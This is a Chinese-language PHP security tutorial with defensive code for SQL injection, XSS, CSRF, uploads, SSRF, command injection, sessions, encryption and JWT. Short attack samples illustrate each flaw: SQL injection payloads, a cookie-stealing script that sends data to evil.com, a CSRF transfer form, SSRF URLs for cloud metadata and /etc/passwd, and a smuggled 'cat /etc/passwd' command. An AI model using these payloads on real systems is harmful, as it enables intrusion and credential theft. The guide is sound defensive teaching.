# PHP 安全实战指南

> SQL 注入、XSS、CSRF、文件上传、JWT — 从漏洞原理到防御代码

---

## 目录

1. [安全基础](#1-安全基础)
2. [SQL 注入](#2-sql-注入)
3. [XSS 跨站脚本](#3-xss-跨站脚本)
4. [CSRF 跨站请求伪造](#4-csrf-跨站请求伪造)
5. [文件上传安全](#5-文件上传安全)
6. [SSRF 服务端请求伪造](#6-ssrf-服务端请求伪造)
7. [命令注入](#7-命令注入)
8. [会话安全](#8-会话安全)
9. [加密与哈希](#9-加密与哈希)
10. [JWT 安全实践](#10-jwt-安全实践)
11. [安全头配置](#11-安全头配置)
12. [注入攻击速查表](#12-注入攻击速查表)

---

## 1. 安全基础

```
PHP 常见攻击面：
  GET/POST 参数      → SQL注入、XSS
  Cookie/Session     → 会话劫持
  文件上传           → 木马、路径穿越
  第三方 API 调用     → SSRF
  shell_exec/exec    → 命令注入
  反序列化           → 对象注入
  Header 头          → Header 注入

防御原则：
  1. 不过滤输入，过滤输出
  2. 永远不信任用户输入
  3. 最小权限原则
  4. 纵深防御（多层防护）
```

---

## 2. SQL 注入

### 2.1 注入类型

```php
// ═══ 数值型注入 ═══
// URL: /user?id=1 OR 1=1
// SELECT * FROM users WHERE id = 1 OR 1=1  → 查到所有用户

// ═══ 字符型注入 ═══
// URL: /user?name=admin' OR '1'='1
// SELECT * FROM users WHERE name = 'admin' OR '1'='1'

// ═══ 联合注入 ═══
// /product?id=-1 UNION SELECT 1,username,password FROM users

// ═══ 盲注（Boolean-based） ═══
// /user?id=1 AND 1=1  → 正常
// /user?id=1 AND 1=2  → 空
// → 确认存在注入点

// ═══ 时间盲注 ═══
// /user?id=1 AND IF(SUBSTR(database(),1,1)='a', SLEEP(5), 0)
```

### 2.2 PDO 参数化查询（唯一正解）

```php
// ✅ 参数化查询（PDO 预处理）
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);
$user = $stmt->fetch();

// ✅ LIKE 查询也安全
$stmt = $pdo->prepare('SELECT * FROM products WHERE name LIKE :keyword');
$stmt->execute(['keyword' => '%' . $keyword . '%']);

// ✅ IN 查询（占位符数量动态）
$ids = [1, 2, 3];
$placeholders = implode(',', array_fill(0, count($ids), '?'));
$stmt = $pdo->prepare("SELECT * FROM users WHERE id IN ({$placeholders})");
$stmt->execute($ids);

// ✅ 动态排序字段（白名单！）
$allowedColumns = ['id', 'name', 'created_at', 'score'];
$orderBy = $_GET['order_by'] ?? 'id';
if (!in_array($orderBy, $allowedColumns)) {
    $orderBy = 'id';  // 不在白名单就用默认值
}
$direction = $_GET['dir'] === 'asc' ? 'ASC' : 'DESC';
$stmt = $pdo->query("SELECT * FROM users ORDER BY {$orderBy} {$direction}");

// ❌ 绝对不要拼接
// $pdo->query("SELECT * FROM users WHERE id = {$_GET['id']}");
// $mysqli->query("SELECT ... WHERE name = '{$_GET['name']}'");
```

---

## 3. XSS 跨站脚本

### 3.1 三种 XSS

```php
// ═══ 存储型（最危险） ═══
// 用户评论：<script>fetch('https://evil.com?cookie='+document.cookie)</script>
// 存入数据库 → 其他人访问时执行 → 窃取 Cookie

// ═══ 反射型 ═══
// /search?q=<script>alert(1)</script>
// 服务器直接输出 q 参数到 HTML

// ═══ DOM 型 ═══
// 纯前端漏洞，不经过服务端
// URL: /page#<img src=x onerror=alert(1)>
```

### 3.2 输出转义

```php
final class XssFilter
{
    // ═══ HTML 上下文 ═══
    // 输出到 HTML 内容中
    public static function html(string $input): string
    {
        return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    // <script>alert(1)</script> → &lt;script&gt;alert(1)&lt;/script&gt;

    // ═══ 输出到 HTML 属性 ═══
    // <div title="$content">
    public static function attr(string $input): string
    {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }

    // ═══ 输出到 JavaScript ═══
    public static function js(string $input): string
    {
        return json_encode($input, JSON_UNESCAPED_UNICODE);
    }

    // ═══ 输出到 URL ═══
    public static function url(string $input): string
    {
        return rawurlencode($input);
    }

    // ═══ 富文本过滤 ═══
    // 允许部分 HTML 标签（b/i/a/img），去掉 script/onerror
    public static function richText(string $html): string
    {
        // composer require ezyang/htmlpurifier
        $config = HTMLPurifier_Config::createDefault();
        $config->set('HTML.Allowed', 'p,b,i,a[href],img[src|alt],ul,ol,li,br');
        $purifier = new HTMLPurifier($config);
        return $purifier->purify($html);
    }
}

// Twig 模板自动转义
// {{ user.name }}  → 自动 htmlspecialchars
// {{ user.name|raw }} → 不转义（谨慎！）
```

### 3.3 Cookie 安全

```php
// ✅ 防止 XSS 窃取 Cookie
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'domain'   => 'example.com',
    'secure'   => true,       // 仅 HTTPS
    'httponly' => true,       // 禁止 JavaScript 读取
    'samesite' => 'Lax',      // 限制跨站
]);
```

---

## 4. CSRF 跨站请求伪造

### 4.1 攻击原理

```
1. 用户登录了 a.com（Cookie 有效）
2. 用户访问恶意网站 b.com
3. b.com 页面有隐藏表单：
   <form action="https://a.com/transfer" method="POST">
     <input name="to" value="hacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. 浏览器自动带 Cookie 发送请求 → 转账成功！
```

### 4.2 Token 防御

```php
final class CsrfProtection
{
    // ═══ 生成 Token ═══
    public static function generate(): string
    {
        $token = bin2hex(random_bytes(32));
        $_SESSION['csrf_token'] = $token;
        return $token;
    }

    // ═══ 验证 Token ═══
    public static function verify(string $token): bool
    {
        if (!isset($_SESSION['csrf_token'])) {
            return false;
        }
        return hash_equals($_SESSION['csrf_token'], $token);
    }

    // ═══ 输出隐藏域 ═══
    public static function hiddenField(): string
    {
        $token = self::generate();
        return "<input type=\"hidden\" name=\"csrf_token\" value=\"{$token}\">";
    }

    // ═══ POST 请求检查 ═══
    public static function check(): void
    {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $token = $_POST['csrf_token'] ?? $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
            if (!self::verify($token)) {
                http_response_code(403);
                die('CSRF 验证失败');
            }
        }
    }
}

// 全局中间件
CsrfProtection::check();
```

### 4.3 SameSite Cookie

```php
// SameSite=Strict：任何跨站都不带 Cookie（最严）
// SameSite=Lax：跨站GET不带，但顶级导航的GET带（推荐）
// SameSite=None：跨站也带（必须配合 Secure）
session_set_cookie_params(['samesite' => 'Strict']);
```

---

## 5. 文件上传安全

```php
final class SecureUpload
{
    private array $allowedMime = [
        'image/jpeg'          => 'jpg',
        'image/png'           => 'png',
        'image/webp'          => 'webp',
        'application/pdf'     => 'pdf',
    ];

    private int $maxSize = 5 * 1024 * 1024;  // 5MB

    public function upload(array $file): string
    {
        // 1. 检查上传错误
        if ($file['error'] !== UPLOAD_ERR_OK) {
            throw new \RuntimeException('上传失败: ' . $file['error']);
        }

        // 2. 检查文件大小
        if ($file['size'] > $this->maxSize) {
            throw new \RuntimeException('文件太大');
        }

        // 3. 检查 MIME（不要信 $_FILES['type']）
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $realMime = $finfo->file($file['tmp_name']);

        if (!isset($this->allowedMime[$realMime])) {
            throw new \RuntimeException("不允许的类型: {$realMime}");
        }

        // 4. 生成随机文件名（绝不用原始名）
        $ext = $this->allowedMime[$realMime];
        $newName = bin2hex(random_bytes(16)) . '.' . $ext;

        // 5. 存储到 Web 不可访问目录
        $storagePath = '/var/www/storage/uploads/' . date('Y/m/d');
        if (!is_dir($storagePath)) {
            mkdir($storagePath, 0755, true);
        }
        $dest = $storagePath . '/' . $newName;

        // 6. 移动文件
        if (!move_uploaded_file($file['tmp_name'], $dest)) {
            throw new \RuntimeException('移动文件失败');
        }

        return $dest;
    }

    // ═══ 图片二次处理（清除恶意代码） ═══
    public static function sanitizeImage(string $path): void
    {
        $info = getimagesize($path);
        if ($info === false) return;

        switch ($info[2]) {
            case IMAGETYPE_JPEG:
                $img = imagecreatefromjpeg($path);
                imagejpeg($img, $path, 90);
                break;
            case IMAGETYPE_PNG:
                $img = imagecreatefrompng($path);
                imagepng($img, $path, 9);
                break;
        }
        if (isset($img)) imagedestroy($img);
    }
}
```

---

## 6. SSRF 服务端请求伪造

```php
// ═══ 攻击 ═══
// /fetch?url=http://169.254.169.254/latest/meta-data/  → 读取 AWS 凭证
// /fetch?url=http://127.0.0.1:6379/  → 攻击内部 Redis
// /fetch?url=file:///etc/passwd  → 读系统文件

// ═══ 防御 ═══
final class SSRFProtection
{
    public static function safeFetch(string $url): string
    {
        $parsed = parse_url($url);

        // 1. 只允许 http/https
        if (!in_array(($parsed['scheme'] ?? ''), ['http', 'https'])) {
            throw new \RuntimeException('不支持的协议');
        }

        $host = $parsed['host'] ?? '';

        // 2. 检查是否为内网 IP
        $ip = gethostbyname($host);
        if (self::isInternalIp($ip)) {
            throw new \RuntimeException('不允许访问内网地址');
        }

        // 3. DNS 重绑定防御：解析后再检查一次
        // (gethostbyname 已做了第一次)

        // 4. 限制跳转
        $context = stream_context_create([
            'http' => [
                'follow_location' => 0,      // 不跟随重定向
                'max_redirects'   => 0,
                'timeout'         => 5,
            ],
        ]);

        return file_get_contents($url, false, $context);
    }

    private static function isInternalIp(string $ip): bool
    {
        // 内网 + 环回 + 链路本地
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
    }
}
```

---

## 7. 命令注入

```php
// ═══ 危险 ═══
// $output = shell_exec("ping -c 1 {$_GET['host']}");
// 攻击：host=8.8.8.8; cat /etc/passwd
// 执行：ping -c 1 8.8.8.8; cat /etc/passwd

// ✅ escapeshellarg（安全包单个参数）
$host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 1 {$host}");

// ✅ escapeshellcmd（安全转义整条命令中的元字符）
$cmd = escapeshellcmd($_GET['command']);
// 把所有 ; & | < > ` $ \ ( ) 等转义

// ✅ 根本方案：别用 shell_exec
// 用 PHP 原生函数代替
// shell_exec('ping') → 用 socket_create 发 ICMP
// shell_exec('convert') → 用 Imagick
// shell_exec('ffmpeg') → 用 php-ffmpeg 扩展
```

---

## 8. 会话安全

```php
final class SessionSecurity
{
    public static function init(): void
    {
        // ═══ 安全 Cookie ═══
        session_set_cookie_params([
            'lifetime' => 0,
            'path'     => '/',
            'domain'   => 'example.com',
            'secure'   => true,
            'httponly' => true,
            'samesite' => 'Lax',
        ]);

        // ═══ 会话固定防御 ═══
        // 登录后必须重新生成 Session ID
        session_start();

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
            // 验证密码...
            session_regenerate_id(true);  // true = 删除旧 Session
            $_SESSION['user_id'] = $userId;
        }

        // ═══ 闲置过期 ═══
        $maxIdle = 1800;  // 30 分钟
        if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $maxIdle)) {
            session_unset();
            session_destroy();
        }
        $_SESSION['last_activity'] = time();
    }
}
```

---

## 9. 加密与哈希

### 9.1 密码哈希

```php
// ✅ password_hash（bcrypt / argon2）
$hash = password_hash($password, PASSWORD_ARGON2ID);
// 成本参数越高越慢越安全
// $hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

if (password_verify($password, $hash)) {
    // 登录成功
}

// 检查是否需要重新哈希（算法升级时）
if (password_needs_rehash($hash, PASSWORD_ARGON2ID)) {
    $newHash = password_hash($password, PASSWORD_ARGON2ID);
    // 更新数据库
}

// ❌ 永远不要用 md5/sha1 存密码
// $hash = md5($password);   // 几毫秒就能彩虹表破解
```

### 9.2 对称加密

```php
// ═══ AES-256-GCM ═══
final class Crypto
{
    public static function encrypt(string $plaintext, string $key): string
    {
        $iv = random_bytes(12);  // GCM 推荐 12 字节
        $tag = '';

        $ciphertext = openssl_encrypt(
            $plaintext,
            'aes-256-gcm',
            $key,
            OPENSSL_RAW_DATA,
            $iv,
            $tag
        );

        // iv + tag + ciphertext
        return base64_encode($iv . $tag . $ciphertext);
    }

    public static function decrypt(string $encoded, string $key): string
    {
        $decoded = base64_decode($encoded);
        $iv = substr($decoded, 0, 12);
        $tag = substr($decoded, 12, 16);
        $ciphertext = substr($decoded, 28);

        return openssl_decrypt(
            $ciphertext,
            'aes-256-gcm',
            $key,
            OPENSSL_RAW_DATA,
            $iv,
            $tag
        );
    }
}

// 密钥管理：从环境变量读取（不是硬编码！）
$key = base64_decode(getenv('APP_ENCRYPTION_KEY'));
```

---

## 10. JWT 安全实践

```php
// composer require firebase/php-jwt
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

final class JwtService
{
    // ═══ 签发 ═══
    public function issue(int $userId): string
    {
        $payload = [
            'iss' => 'example.com',          // 签发者
            'sub' => $userId,                // 主题（用户ID）
            'iat' => time(),                 // 签发时间
            'exp' => time() + 3600,          // 过期时间（1小时）
            'nbf' => time(),                 // 在此之前不可用
            'jti' => bin2hex(random_bytes(8)),  // 唯一 ID（防重放）
            'role' => 'user',                // 自定义字段
        ];

        return JWT::encode($payload, $this->getPrivateKey(), 'RS256');
    }

    // ═══ 验证 ═══
    public function verify(string $token): ?object
    {
        try {
            $payload = JWT::decode($token, new Key($this->getPublicKey(), 'RS256'));

            // 必要字段检查
            if ($payload->iss !== 'example.com') return null;

            return $payload;
        } catch (\Exception $e) {
            return null;
        }
    }

    // ═══ 签发 Refresh Token ═══
    public function issueRefresh(int $userId): string
    {
        $refreshToken = bin2hex(random_bytes(32));
        // 存 Redis，设置过期
        $redis = new Redis();
        $redis->connect('127.0.0.1', 6379);
        $redis->setex("refresh_token:{$refreshToken}", 86400 * 7, $userId);
        return $refreshToken;
    }

    private function getPrivateKey(): string
    {
        return file_get_contents('/etc/ssl/jwt_private.pem');
    }

    private function getPublicKey(): string
    {
        return file_get_contents('/etc/ssl/jwt_public.pem');
    }
}

// ═══ JWT 安全要点 ═══
// 1. 用 RS256/ES256（非对称），不用 HS256（对称密钥泄漏全完）
// 2. Access Token 过期 15 分钟，Refresh Token 7 天
// 3. 登出时把 jti 加入 Redis 黑名单
// 4. 不要在 JWT 中放敏感信息（payload 只是 base64 不算加密）
// 5. 设置合理的 exp + nbf
```

---

## 11. 安全头配置

```nginx
# nginx 安全头（最重要）
add_header X-Frame-Options "DENY" always;               # 禁止 iframe
add_header X-Content-Type-Options "nosniff" always;     # 禁止 MIME 嗅探
add_header X-XSS-Protection "0" always;                 # 禁用旧版防护（现代浏览器不需要）
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# CSP（内容安全策略 — 最强 XSS 防线）
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'nonce-{RANDOM}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    frame-ancestors 'none';
    form-action 'self';
" always;

# Permissions-Policy（限制浏览器 API）
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()";
```

---

## 12. 注入攻击速查表

```
攻击类型          攻击目标      防御方法
─────────        ────────      ────────
SQL 注入         数据库         PDO 预处理
NoSQL 注入       MongoDB       $filter 参数化
LDAP 注入        LDAP 服务器    ldap_escape()
XPath 注入       XML 数据库     参数化 XPath
命令注入         OS Shell      escapeshellarg()
代码注入         PHP 引擎      禁用 eval/assert
模板注入         Twig/Blade    沙箱模式
Header 注入      HTTP 响应     禁止 \\r\\n 过滤
反序列化注入     PHP 对象      不反序列化用户数据
XPATH 注入       XML/XPATH     参数化查询
```

---

> 🔒 **安全不是功能而是习惯。每一行代码都问自己：如果这是恶意输入会怎样？**
